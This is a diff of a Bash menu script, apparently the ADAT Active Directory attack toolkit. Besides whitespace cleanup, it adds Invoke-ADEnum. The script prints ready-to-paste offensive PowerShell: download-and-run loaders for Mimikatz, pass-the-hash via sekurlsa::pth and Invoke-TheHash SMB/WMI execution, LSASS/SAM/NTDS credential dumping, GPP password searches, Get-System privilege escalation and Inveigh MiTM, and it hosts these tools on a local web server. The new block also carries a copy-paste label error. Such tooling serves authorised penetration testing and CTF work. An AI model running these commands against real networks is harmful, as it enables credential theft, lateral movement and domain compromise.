@@ -6,22 +6,22 @@
 ################################################################################
 
 
-LocalIP="[Local-IP]";		
-LocalPort="[Local-Port]";		
-Username="'[Username]'";			
-NQUsername="[Username]";			
-Password="''";			
-Domain="'[Domain]'";			
-NQDomain="[Domain]";			
-IP="'[IP]'";			
-NQIP="[IP]";	
-NTLMHash="'[NTLM-Hash]'";	
-NQNTLMHash="[NTLM-Hash]";	
-LDAP="";			
-DC="";				
-NS="<IP>";			
-Version="v2.1"			
-MainCheck="1"			
+LocalIP="[Local-IP]";
+LocalPort="[Local-Port]";
+Username="'[Username]'";
+NQUsername="[Username]";
+Password="''";
+Domain="'[Domain]'";
+NQDomain="[Domain]";
+IP="'[IP]'";
+NQIP="[IP]";
+NTLMHash="'[NTLM-Hash]'";
+NQNTLMHash="[NTLM-Hash]";
+LDAP="";
+DC="";
+NS="<IP>";
+Version="v2.1"
+MainCheck="1"
 
 ################################################################################
 # Future Repo's for external                                                   #
@@ -122,6 +122,7 @@ Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r
 InveighRepo="https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/";
 InvokeNoPacRepo="https://github.com/ricardojba/Invoke-noPac/blob/main/Invoke-noPac.ps1"
 InvokeTheHashRepo="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/";
+InvokeADEnumRepo="https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/"
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
@@ -158,6 +159,7 @@ GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 InveighLocalRepo="$HOME/ADAT/Inveigh"
 InvokeTheHashLocalRepo="$HOME/ADAT/Invoke-TheHash"
 InvokeNoPacLocalRepo="$HOME/ADAT/InvokeNoPacRepo"
+InvokeADEnumLocalRepo="$HOME/ADAT/Invoke-ADEnum"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSharpPackLocalRepo="$HOME/ADAT/PowerSharpPack/PowerSharpBinaries"
@@ -166,7 +168,7 @@ PowersploitLocalRepo="$HOME/ADAT/Powersploit"
 S3cur3Th1sSh1tCredsLocalRepo="$HOME/ADAT/S3cur3Th1sSh1tCreds"
 
 
-if [ -d "$EmpireLocalRepo" ] 
+if [ -d "$EmpireLocalRepo" ]
 then
 	echo -e ""
     	echo -e "Empire is installed, checking if updated to latest version."
@@ -180,13 +182,13 @@ else
 	echo -e ""
 fi
 
-if [ -d "$NishangLocalRepo" ] 
+if [ -d "$NishangLocalRepo" ]
 then
     	echo -e ""
     	echo -e "Nishang is installed, checking if updated to latest version."
     	cd $NishangLocalRepo
     	git pull "https://github.com/samratashok/nishang.git"
-    	echo -e "" 
+    	echo -e ""
 else
 	echo -e ""
 	echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
@@ -194,7 +196,7 @@ else
 	echo -e ""
 fi
 
-if [ -d "$JAWSLocalRepo" ] 
+if [ -d "$JAWSLocalRepo" ]
 then
 	echo -e ""
     	echo -e "JAWS is installed, checking if updated to latest version."
@@ -208,7 +210,7 @@ else
 	echo -e ""
 fi
 
-if [ -d "$GetSystemTechniquesLocalRepo" ] 
+if [ -d "$GetSystemTechniquesLocalRepo" ]
 then
 	echo -e ""
     	echo -e "Get-System-Techniques is installed, checking if updated to latest version."
@@ -222,7 +224,7 @@ else
 	echo -e ""
 fi
 
-if [ -d "$BloodHoundLocalRepo" ] 
+if [ -d "$BloodHoundLocalRepo" ]
 then
 	echo -e ""
     	echo -e "BloodHound is installed, checking if updated to latest version."
@@ -236,7 +238,7 @@ else
 	echo -e ""
 fi
 
-if [ -d "$PowersploitLocalRepo" ] 
+if [ -d "$PowersploitLocalRepo" ]
 then
 	echo -e ""
     	echo -e "Powersploit is installed, checking if updated to latest version."
@@ -348,7 +350,7 @@ else
 	echo -e ""
 fi
 
-if [ -d "$DCSyncToHashcatRepo" ] 
+if [ -d "$DCSyncToHashcatRepo" ]
 then
 	echo -e ""
     	echo -e "DCSync-To-Hashcat is installed, checking if updated to latest version."
@@ -359,6 +361,20 @@ else
 	echo -e ""
 	echo -e "${LGREEN}Cloning DCSync-To-Hashcat Repo${RESTORE}"
 	git clone --recursive "https://github.com/The-Viper-One/DCSync-To-Hashcat.git" $HOME/ADAT/DCSync-To-Hashcat
+	echo -e ""
+fi
+
+if [ -d "$InvokeADEnumLocalRepo" ]
+then
+	echo -e ""
+    	echo -e "Invoke-ADEnum is installed, checking if updated to latest version."
+    	cd $InvokeADEnumLocalRepo
+    	git pull "https://github.com/Leo4j/Invoke-ADEnum.git"
+    	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning DCSync-To-Hashcat Repo${RESTORE}"
+	git clone --recursive "https://github.com/Leo4j/Invoke-ADEnum.git" $HOME/ADAT/Invoke-ADEnum
 	echo -e ""
 fi
 
@@ -379,6 +395,7 @@ cp -r $HOME/ADAT/InvokeNoPacRepo/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/adPEASRepo/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Invoke-TheHash/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/DCSync-To-Hashcat/* $HOME/ADAT/LocalRepo
+cp -R $HOME/ADAT/Invoke-ADEnum/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -400,6 +417,7 @@ InvokeNoPacRepo="http://$LocalIP:$LocalPort/"
 DCSyncToHashcatRepo="http://$LocalIP:$LocalPort/"
 InvokeTheHashRepo="http://$LocalIP:$LocalPort/"
 adPEASRepo="http://$LocalIP:$LocalPort/"
+InvokeADEnumRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
 
 }
@@ -407,22 +425,22 @@ LocalRepo="True"
 Internal_Menu_Host_Local(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
 echo -e "${LGREEN}Set Local Host Variables${RESTORE}"
 echo -e ""
-echo -ne "	
-  	This option is used for when hosting the scripts utlizied by ADAT 
+echo -ne "
+  	This option is used for when hosting the scripts utlizied by ADAT
 	are required on the local host rather than being called from GitHub.
-	   
+
 	This is preferable under two primary circumstances
-	   
+
 	- GitHub is not reachable from within the network you are testing on
 	- You are doing a CTF and the machine has no access to the internet
-	
-	
+
+
 "
 echo -e "${YELLOW}External IP${RESTORE}" & curl ifconfig.me
 echo -e ""
@@ -456,12 +474,12 @@ echo -e "Python server starting on http://$LocalIP:$LocalPort"
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
 sleep 3s
-	
+
 
 echo -ne "
 
             Return to previous menu?
-                 	
+
         Q) -> Previous Menu
 "
         read a
@@ -506,13 +524,13 @@ echo -ne " What would you like to do?
         7)  ->  [ Privilege Escalation		]
         8)  ->  [ Recon 			]
         9)  ->	[ Token Manipulation		]
-        
+
         A)  ->	[ AMSI Bypasses			]
         E)  ->	[ Recent CVE's			]
         L)  -> 	[ Host scripts on local host	]
-        
+
         Q)  ->	[Previous Menu			]
-        
+
 "
         read a
         case $a in
@@ -537,7 +555,7 @@ echo -ne " What would you like to do?
 Internal_Menu_Alternate_Authentication(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -547,7 +565,7 @@ echo -ne " Select Alternate Authentication Material Type
 
         1)  ->  [ Pass the Hash			]
         2)  ->  [ Pass the Ticket		]
-                
+
         Q)  ->	[Previous Menu			]
 "
 
@@ -568,10 +586,10 @@ Internal_Menu_Alternate_Authentication_Pass_Hash(){
 
 echo -e ""
 echo -e ""
-echo -e ""      
+echo -e ""
 echo -e "${LGREEN}Pass the Hash${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}Mimikatz${RESTORE}"  
+echo -e "${IBLUE}Mimikatz${RESTORE}"
 echo -e ""
 echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1)"
@@ -580,7 +598,7 @@ echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTO
 echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:$NQUsername /domain:$NQDomain /ntlm:$NQNTLMHash /run:powershell.exe"\"'"
 echo -e ""
 echo -e ""
-echo -e "${IBLUE}Invoke-TheHash${RESTORE}"  
+echo -e "${IBLUE}Invoke-TheHash${RESTORE}"
 echo -e ""
 echo -e "${YELLOW}Load all scripts into memory${RESTORE}"
 echo -e "$DownloadMethod "$InvokeTheHashRepo"Invoke-SMBExec.ps1);"
@@ -589,7 +607,7 @@ echo -e "$DownloadMethod "$InvokeTheHashRepo"Invoke-TheHash.ps1);"
 echo -e "$DownloadMethod "$InvokeTheHashRepo"Invoke-SMBEnum.ps1);"
 echo -e "$DownloadMethod "$InvokeTheHashRepo"Invoke-SMBClient.ps1)"
 echo -e ""
-echo -e "${IBLUE}Invoke-TheHash - SMB${RESTORE}"  
+echo -e "${IBLUE}Invoke-TheHash - SMB${RESTORE}"
 echo -e ""
 echo -e "${YELLOW}Check SMB signing${RESTORE}"
 echo -e "Invoke-TheHash -Type SMBExec -Target $IP"
@@ -607,7 +625,7 @@ echo -e "${YELLOW}Enumerate SMB Shares / Users / Net Sessions ${RESTORE}"
 echo -e "Invoke-SMBEnum -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target $IP"
 echo -e "Invoke-SMBEnum -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target [CIDR]"
 echo -e ""
-echo -e "${IBLUE}Invoke-TheHash - WMI${RESTORE}"  
+echo -e "${IBLUE}Invoke-TheHash - WMI${RESTORE}"
 echo -e ""
 echo -e "${YELLOW}Check for command execution ${RESTORE}"
 echo -e "Invoke-TheHash -Type WMIExec -Username $Username -Hash $NTLMHash -Target $IP"
@@ -621,7 +639,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -631,7 +649,7 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Alternate_Authentication_Pass_Hash;;
         esac
-        
+
 }
 
 
@@ -641,10 +659,10 @@ Internal_Menu_Alternate_Authentication_Pass_Ticket(){
 
 echo -e ""
 echo -e ""
-echo -e ""      
+echo -e ""
 echo -e "${LGREEN}Pass the Ticket${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}Mimikatz${RESTORE}"  
+echo -e "${IBLUE}Mimikatz${RESTORE}"
 echo -e ""
 echo -e "${YELLOW}Load Mimikatz into memory${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz"
@@ -679,7 +697,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -689,7 +707,7 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Alternate_Authentication_Pass_Ticket;;
         esac
-        
+
 }
 
 Internal_Menu_Certificate_Services(){
@@ -698,7 +716,7 @@ Internal_Menu_Certificate_Services(){
 
 echo -e ""
 echo -e ""
-echo -e ""      
+echo -e ""
 echo -e "${LGREEN}Certificate Services${RESTORE}"
 echo -e ""
 echo -e "Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target."
@@ -740,7 +758,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -750,14 +768,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Certificate_Services;;
         esac
-        
+
 }
 
 
 Internal_Menu_Credential_Access(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -770,7 +788,7 @@ echo -ne " Select Credential Access Type
         3)  ->  [ Credentials from Group Policy		]
         4)  ->	[ Credentials from Web Browsers		]
         5)  -> 	[ Unsecured Credentials			]
-                
+
         Q)  ->	[Previous Menu		    		]
 "
 
@@ -792,7 +810,7 @@ echo -ne " Select Credential Access Type
 Internal_Menu_Credential_Access_Credential_Dumping(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -805,7 +823,7 @@ echo -ne " Select Credential Dumping Type
         3)  ->	[ LSASS Memory		    ]
         4)  -> 	[ NTDS			    ]
         5)  ->	[ SAM			    ]
-        
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -829,7 +847,7 @@ Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials(){
 
 echo -e ""
 echo -e ""
-echo -e ""      
+echo -e ""
 echo -e "${LGREEN}Cached Domain Credentials${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}LaZagne${RESTORE}"
@@ -842,7 +860,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -862,8 +880,8 @@ Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets(){
 	clear
 
 echo -e ""
-echo -e "" 
-echo -e ""      
+echo -e ""
+echo -e ""
 echo -e "${LGREEN}LSA Secrets${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Mimikatz${RESTORE}"
@@ -873,7 +891,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -894,8 +912,8 @@ Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory(){
 	clear
 
 echo -e ""
-echo -e "" 
-echo -e ""      
+echo -e ""
+echo -e ""
 echo -e "${LGREEN}LSASS Memory${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Mimikatz${RESTORE}"
@@ -919,7 +937,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -939,8 +957,8 @@ Internal_Menu_Credential_Access_Credential_Dumping_NTDS(){
 	clear
 
 echo -e ""
-echo -e "" 
-echo -e ""      
+echo -e ""
+echo -e ""
 echo -e "${LGREEN}NTDS${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-DCSyncTH${RESTORE}"
@@ -955,7 +973,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -976,8 +994,8 @@ Internal_Menu_Credential_Access_Credential_Dumping_SAM(){
 	clear
 
 echo -e ""
-echo -e "" 
-echo -e ""      
+echo -e ""
+echo -e ""
 echo -e "${LGREEN}SAM${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Mimikatz${RESTORE}"
@@ -995,7 +1013,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1014,8 +1032,8 @@ Internal_Menu_Credential_Access_Credential_Manager(){
 	clear
 
 echo -e ""
-echo -e "" 
-echo -e ""      
+echo -e ""
+echo -e ""
 echo -e "${LGREEN}Credential Manager${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Get-VaultCredential${RESTORE}"
@@ -1031,7 +1049,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1052,13 +1070,13 @@ echo -e ""
 echo -e ""
 echo -e ""
 echo -e "${LGREEN}Group Policy${RESTORE}"
-echo -e ""    
+echo -e ""
 echo -e "${IBLUE}CMD${RESTORE}"
 echo -ne "
 findstr /S cpassword %logonserver%\sysvol\*.xml
 findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
 "
-echo -e ""  
+echo -e ""
 echo -e "${IBLUE}Get-CachedGPPPassword${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
 echo -e ""
@@ -1066,7 +1084,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1099,7 +1117,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1116,7 +1134,7 @@ echo -ne  "Return to Previous Menu?
 Internal_Menu_Credential_Access_Unsecured_Credentials(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1126,7 +1144,7 @@ echo -ne " Select Unsecured Credentials Type
 
         1)  ->  [ Credentials in Files 		]
         2)  ->  [ Credentials in Registry	]
-        
+
         Q)  ->	[Previous Menu			]
 "
 
@@ -1172,7 +1190,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1182,7 +1200,7 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files;;
         esac
-        
+
 }
 
 
@@ -1220,7 +1238,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1230,14 +1248,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry;;
         esac
-        
+
 }
 
 
 Internal_Menu_Recon(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1247,9 +1265,9 @@ echo -ne " Select Recon Type
 
         1)  ->  [ Domain Recon 		]
         2)  ->  [ File and Share Recon 	]
-        3)  ->  [ Local Host Recon	] 
+        3)  ->  [ Local Host Recon	]
         4)  ->  [ Network Recon 	]
-                 
+
         Q)  ->	[Previous Menu		]
 "
         read a
@@ -1268,7 +1286,7 @@ echo -ne " Select Recon Type
 Internal_Menu_Token(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1278,7 +1296,7 @@ echo -ne " Select Token Manipulation tool Type
 
         1)  ->  [ Invoke-SharpImpersonation ${LYELLOW}WIP${RESTORE}]
         2)  ->  [ Invoke-TokenVator  ${LYELLOW}WIP${RESTORE}]
-        
+
         Q)  ->	[Previous Menu		]
 "
         read a
@@ -1296,7 +1314,7 @@ echo -ne " Select Token Manipulation tool Type
 Internal_Menu_Token_SharpImpersonation(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1325,7 +1343,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1342,7 +1360,7 @@ echo -ne  "Return to Previous Menu?
 Internal_Menu_Token_TokenVator(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1373,7 +1391,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1383,7 +1401,7 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Token_TokenVator;;
         esac
-        
+
 }
 
 Internal_Menu_Recon_Local_Host(){
@@ -1392,7 +1410,7 @@ Internal_Menu_Recon_Local_Host(){
 
 echo -e ""
 echo -e ""
-echo -e ""      
+echo -e ""
 echo -e "${LGREEN}Local Host Enumeration${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}HostRecon${RESTORE}"
@@ -1419,7 +1437,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1435,7 +1453,7 @@ echo -ne  "Return to Previous Menu?
 Internal_Menu_Recon_Domain(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1454,14 +1472,14 @@ echo -ne " Select Domain Recon Type
         9)  ->	[ Domain Trusts 		]
         10) -> 	[ Domain Users 			]
         T)  ->  [ Tools				]
-        
-                
+
+
         Q)  ->	[Previous Menu		    	]
 "
         read a
         case $a in
         	1) 	Internal_Menu_Recon_Domain_ACL ;;
-        	2) 	Internal_Menu_Recon_Domain_Controllers ;;	
+        	2) 	Internal_Menu_Recon_Domain_Controllers ;;
 	        3) 	Internal_Menu_Recon_Domain_Computers_Servers ;;
 	        4) 	Internal_Menu_Recon_Domain_Delegation ;;
 	        5) 	Internal_Menu_Recon_Domain_Forests ;;
@@ -1481,7 +1499,7 @@ echo -ne " Select Domain Recon Type
 Internal_Menu_Recon_Domain_ACL(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1502,11 +1520,11 @@ echo -e ""
 echo -e "${IBLUE}Get the ACLs associated with the specified Path${RESTORE}"
 echo -e "Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
 echo -e ""
-echo -e "" 
+echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-     
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1523,7 +1541,7 @@ echo -ne  "Return to Previous Menu?
 Internal_Menu_Recon_Domain_Controllers(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1539,7 +1557,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-        
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1556,7 +1574,7 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Computers_Servers(){
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1573,7 +1591,7 @@ echo -e "Get-DomainComputer -Ping"
 echo -e ""
 echo -e "${IBLUE}Computers by Operating System${RESTORE}"
 echo -e "Get-DomainComputer -OperatingSystem 'Windows 10*'| Select Name,dnshostname,operatingsystem,operatingsystemversion "
-echo -e "Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"  
+echo -e "Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
 echo -e ""
 echo -e "${IBLUE}Servers by Operating System${RESTORE}"
 echo -e "Get-DomainComputer -OperatingSystem 'Windows Server*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
@@ -1582,7 +1600,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-     
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1599,7 +1617,7 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Delegation(){
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1619,7 +1637,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1636,7 +1654,7 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Forests(){
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1661,7 +1679,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1678,7 +1696,7 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_GPO() {
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1698,7 +1716,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-      
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1714,7 +1732,7 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Groups() {
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1744,7 +1762,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-     
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1761,12 +1779,12 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Policies() {
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
 echo -e "${LGREEN}Domain Policies${RESTORE}"
-echo -e "" 
+echo -e ""
 echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
 echo -e ""
@@ -1780,7 +1798,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1797,12 +1815,12 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Trusts() {
 
 	clear
- 
+
 echo -e ""
 echo -e ""
 echo -e ""
 echo -e "${LGREEN}Domain Trusts${RESTORE}"
-echo -e "" 
+echo -e ""
 echo -e "${YELLOW}Load PowerView into memory ${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1)"
 echo -e ""
@@ -1826,7 +1844,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-     
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1843,7 +1861,7 @@ echo -ne  "Return to Domain Recon Menu?
 Internal_Menu_Recon_Domain_Users(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1883,7 +1901,7 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-      
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1900,7 +1918,7 @@ Internal_Menu_Recon_Domain_Tools(){
 
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1915,11 +1933,13 @@ echo -e "${IBLUE}BloodHound${RESTORE}"
 echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
 echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
 echo -e ""
+echo -e "${IBLUE}Invoke-ADEnum${RESTORE}"
+echo -e "$DownloadMethod "$InvokeADEnumRepo"Invoke-ADEnum.ps1);Invoke-ADEnum"
 echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-      
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1961,7 +1981,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-      
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -1978,7 +1998,7 @@ echo -ne  "Return to Previous Menu?
 Internal_Menu_Recon_File_Share() {
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2004,7 +2024,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-       
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2030,7 +2050,7 @@ echo -ne " Select Privilege Escalation Type
 
         1)  ->  [ Checks 	]
         2)  ->  [ Exploits 	]
-                       
+
         Q)  ->	[Previous Menu	]
 "
         read a
@@ -2046,7 +2066,7 @@ echo -ne " Select Privilege Escalation Type
 Internal_Menu_Privilege_Escalation_Checks(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2074,7 +2094,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2084,13 +2104,13 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Privilege_Escalation_Checks;;
         esac
-        
+
 }
 
 Internal_Menu_Privilege_Escalation_Exploits(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2102,11 +2122,11 @@ echo -e ""
 echo -e "${IBLUE}Get-System${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
 echo -e ""
-echo -e ""   
+echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2116,14 +2136,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Privilege_Escalation_Exploits;;
         esac
-          
+
 }
 
 
 Internal_Menu_MiTM_Attacks(){
 
 	clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2132,7 +2152,7 @@ echo -ne " Select MiTM Type
 
 
         1)  ->  [ Inveigh		]
-                
+
         Q)  ->	[ Previous Menu		]
 "
 
@@ -2148,7 +2168,7 @@ echo -ne " Select MiTM Type
 Internal_Menu_MiTM_Inveigh(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2170,7 +2190,7 @@ Stop-Inveigh
 "
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2180,14 +2200,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_MiTM_Inveigh;;
         esac
-        
+
 
 }
 
 Internal_Menu_MSSQL(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2199,7 +2219,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2210,14 +2230,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_MSSQL;;
         esac
-        
+
 
 }
 
 Internal_Menu_Password_Spraying(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2244,7 +2264,7 @@ echo -e ""
 
